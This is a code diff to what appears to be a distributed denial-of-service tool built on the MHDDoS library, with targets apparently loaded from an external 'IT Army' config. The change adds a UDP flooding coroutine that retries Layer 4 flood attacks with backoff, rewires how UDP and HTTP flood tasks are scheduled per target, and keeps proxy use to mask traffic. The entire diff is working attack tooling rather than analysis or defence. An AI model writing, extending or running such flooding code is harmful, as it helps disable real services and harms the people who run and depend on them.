@@ -14,7 +14,7 @@ from src.cli import init_argparse
 from src.concurrency import DaemonThreadPool
 from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, Params, Stats
 from src.dns_utils import resolve_all_targets
-from src.mhddos import async_main as mhddos_async_main
+from src.mhddos import async_main as mhddos_async_main, AsyncLayer4, AsyncHttpFlood
 from src.output import show_statistic, print_banner, print_progress
 from src.proxies import ProxySet
 from src.system import fix_ulimits, is_latest_version
@@ -30,7 +30,7 @@ class Flooder:
         self._runnables = None
         self._current_task = None
 
-    def update_targets(self, runnables: Iterator[Any]):
+    def update_targets(self, runnables: Iterator[AsyncHttpFlood]) -> None:
         self._runnables = runnables
         if self._current_task is not None:
             self._current_task.cancel()
@@ -50,7 +50,19 @@ class Flooder:
                     break
 
 
-# XXX: UDP
+async def udp_flooder(runnable: AsyncLayer4) -> None:
+    backoff = 0.1
+    while True:
+        try:
+            await runnable.run()
+        except asyncio.CancelledError:
+            return
+        except Exception:
+            # avoid costly cycles if fails immediately
+            await asyncio.sleep(backoff)
+            backoff = max(2, backoff*2)
+
+
 async def run_ddos(
     proxies: Optional[ProxySet],
     targets_loader,
@@ -61,7 +73,6 @@ async def run_ddos(
     debug,
     table,
     total_threads,
-    udp_threads,
     switch_after,
 ):
     statistics = {}
@@ -98,16 +109,16 @@ async def run_ddos(
         await asyncio.sleep(5)
 
     flooders = [Flooder(switch_after) for _ in range(total_threads)]
-    udp_flooders = [Flooder(switch_after) for _ in range(udp_threads)]
+    udp_taskset = None
 
     # XXX: might throw an exception
     async def load_targets():
         targets, changed = await targets_loader.load()
-        # XXX: use async DNS resolver or offload properly
         targets = await resolve_all_targets(targets)
         return [target for target in targets if target.is_resolved], changed
 
     def install_targets(targets):
+        nonlocal udp_taskset
         kwargs_list, udp_kwargs_list = [], []
         for target in targets:
             assert target.is_resolved, "Unresolved target cannot be used for attack"
@@ -130,12 +141,12 @@ async def run_ddos(
             runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
             for flooder in flooders:
                 flooder.update_targets(runnables_iter)
-        # XXX: there should be a better way to write this code
         if udp_kwargs_list:
-            udp_runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in udp_kwargs_list)
-            for flooder in udp_flooders:
-                flooder.update_targets(udp_runnables_iter)
-
+            udp_runnables = [mhddos_async_main(**kwargs) for kwargs in udp_kwargs_list]
+            udp_tasks = [asyncio.ensure_future(udp_flooder(run)) for run in udp_runnables]
+            if udp_taskset is not None:
+                udp_taskset.cancel()
+            udp_taskset = asyncio.ensure_future(asyncio.gather(*udp_tasks))
 
     initial_targets, _ = await load_targets()
     if not initial_targets:
@@ -143,7 +154,7 @@ async def run_ddos(
         exit()
     install_targets(initial_targets)
 
-    tasks = [asyncio.ensure_future(f.loop()) for f in (flooders + udp_flooders)]
+    tasks = [asyncio.ensure_future(f.loop()) for f in flooders]
 
     async def stats_printer():
         refresh_rate = 5
@@ -257,8 +268,9 @@ async def start(args, shutdown_event: Event):
     else:
         targets_loader = TargetsLoader(args.targets, args.config)
 
-    # XXX: fix for UDP targets
-    no_proxies = args.vpn_mode # or all(target.is_udp for target in targets)
+    # we are going to fetch proxies even in case we have only UDP
+    # targets because the list of targets might change at any point in time
+    no_proxies = args.vpn_mode
     proxies = None if no_proxies else ProxySet(args.proxies)
 
     # XXX: with the current implementation there's no need to
@@ -274,7 +286,6 @@ async def start(args, shutdown_event: Event):
         args.debug,
         args.table,
         args.threads,
-        0, # XXX: get back to this functionality later args.udp_threads,
         args.switch_after,
     )
     shutdown_event.set()
